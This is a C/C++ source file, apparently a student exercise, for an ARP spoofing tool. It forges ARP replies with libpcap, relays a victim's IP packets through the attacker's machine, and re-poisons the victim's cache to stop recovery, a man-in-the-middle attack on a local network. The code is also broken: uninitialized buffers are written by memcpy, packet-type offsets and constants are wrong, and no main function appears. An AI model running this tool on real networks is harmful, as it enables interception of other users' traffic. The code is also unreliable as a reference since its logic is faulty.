#include <stdio.h>
#include <pcap.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <algorithm>
using namespace std;

#define REQUEST 1
#define REPLY 2

typedef struct arp_packet{
  uint8_t dest_mac[6];	//6
  uint8_t src_mac[6];	//12
  uint16_t type;	//14

  uint16_t hw_type;	//16
  uint16_t protocol_type;//18
  uint8_t hw_size;	//19
  uint8_t protocol_size;//20
  uint16_t opcode;	//22
  uint8_t src_mac2[6];	//28
  uint8_t src_ip[4];	//32
  uint8_t dest_mac2[6];	//38
  uint8_t dest_ip[4];	//42
} packet;


void usage() {
  printf("syntax: arp_spoof <interface> <sender ip> <target ip>\n");
  printf("example: arp_spoof wlan0 192.168.10.2 192.168.10.1\n");
  return;
}

void print_IP(uint8_t* ip) {
  printf("%d.%d.%d.%d\n\n", ip[0], ip[1], ip[2], ip[3]);
  return;
}

void print_mac(uint8_t* mac) {
  printf("%02x:%02x:%02x:%02x:%02x:%02x\n\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return;
}

void parse_IP(char* ip, uint8_t* out) {
  out[0] = (uint8_t)atoi(strtok(ip, "."));
  for(int i = 1; i < 4; i++) {
    out[i] = (uint8_t)atoi(strtok(NULL, "."));
  }
  return;
}

int get_attacker_IP(const char* ifr, uint8_t* out) { 
  int sockfd;
  struct ifreq ifrq;
  struct sockaddr_in* sin;
  sockfd = socket(AF_INET, SOCK_DGRAM, 0);
  strcpy(ifrq.ifr_name, ifr);
  if(ioctl(sockfd, SIOCGIFADDR, &ifrq) < 0) {
      perror( "ioctl() SIOCGIFADDR error");
      return -1;
  }
  sin = (struct sockaddr_in *)&ifrq.ifr_addr;
  memcpy (out, (void*)&sin->sin_addr, sizeof(sin->sin_addr));

  close(sockfd);

  return 4;
}  

int get_attacker_mac(char* device, uint8_t* out) {
  char errbuf[PCAP_ERRBUF_SIZE];

  int s = socket(AF_INET, SOCK_DGRAM, 0);
  if(s < 0) {
    perror("soccket fail");
    return -1;
  }

  struct ifreq ifr;
  strncpy(ifr.ifr_name, device, IFNAMSIZ);

  if(ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
    perror("ioctl fail");
    return -1;
  }

  memcpy(out, (uint8_t*)ifr.ifr_hwaddr.sa_data, sizeof(ifr.ifr_hwaddr.sa_data));
  close(s);

  return 0;
}

void send_arp(pcap_t* handle, int packet_type, uint8_t* src_ip, uint8_t* dest_ip, uint8_t* src_mac, uint8_t* dest_mac) {
  packet pk;
  
  if(packet_type == REPLY) {
    for(int i = 0; i < 6; i++) {
      pk.dest_mac[i] = dest_mac[i];
      pk.dest_mac2[i] = dest_mac[i];
    }
  }
  else if(packet_type == REQUEST) {
    for(int i = 0; i < 6; i++) {
      pk.dest_mac[i] = dest_mac[i];
      pk.dest_mac2[i] = 0x00;
    }
  }

  for(int i = 0; i < 6; i++) {
    pk.src_mac[i] = src_mac[i];
    pk.src_mac2[i] = src_mac[i];
  }

  for(int i = 0; i < 4; i++) {
    pk.src_ip[i] = src_ip[i];
    pk.dest_ip[i] = dest_ip[i];
  }

  pk.type = htons(0x0806);
  pk.hw_type = htons(0x0001);
  pk.protocol_type = htons(0x0800);
  pk.hw_size = 0x06;
  pk.protocol_size = 0x04;
  pk.opcode = htons(packet_type);

  u_char packet[42];
  memcpy(packet, &pk, 42);
  if (pcap_sendpacket(handle, packet, 42) != 0) {
    fprintf(stderr, "packet send error");
    return;
  }
  return;
}

int get_mac_by_ip(pcap_t* handle, uint8_t* sender_ip, uint8_t* sender_mac) {
//  int i = 0;
  struct pcap_pkthdr* header;
  const u_char* packet;
  int res = pcap_next_ex(handle, &header, &packet);
//  if (res == 0) continue;
  if (res == -1 || res == -2) return 1;
//    printf("%d", i);
  if(!memcmp(packet+26, sender_ip, 4)){
    for(int i = 0; i < 6; i++) {
      sender_mac[i] = (uint8_t)packet[i + 6];
    }
    return 0;
  }
  return 1;
}

void relay_ip_packet(pcap_t* handle, uint8_t* my_ip, uint8_t* my_mac, uint8_t* src_mac, uint8_t* dest_mac) {
  struct pcap_pkthdr* header;
  const u_char* packet;
  int res = pcap_next_ex(handle, &header, &packet);
  if (res == -1 || res == -2) return;
  
  u_char* relay;
  if(packet[18] == 0x08 && packet[19] == 0x00) {
    if(memcmp(packet+30, my_ip, 4)) {
      if(!memcmp(packet+6, src_mac, 6)){
        memcpy(relay, packet, header->caplen);
        for(int i = 0; i < 6; i++) {
          relay[i] = my_mac[i];
          relay[i + 6] = dest_mac[i];
        }
      }
      pcap_sendpacket(handle, relay, header->caplen);
    }
  }
  return;
}

void prevent_arp_recovery(pcap_t* handle, uint8_t* my_ip, uint8_t* src_mac) {
  struct pcap_pkthdr* header;
  const u_char* packet;
  int res = pcap_next_ex(handle, &header, &packet);
  if (res == -1 || res == -2) return;

  u_char* ret;
  if(packet[18] == 0x80 && packet[19] == 0x06) {
    if(memcmp(packet+30, my_ip, 4)) {
      if(!memcmp(packet, src_mac, 6)) {
        memcpy(ret, packet, header->caplen);
        swap_ranges(ret, ret+6, ret+6);
        swap_ranges(ret+22, ret+28, ret+32);
        swap_ranges(ret+28, ret+32, ret+38);
        ret[29] = htons(REPLY);
        pcap_sendpacket(handle, ret, header->caplen);
      }
    }
  }
  return;
}

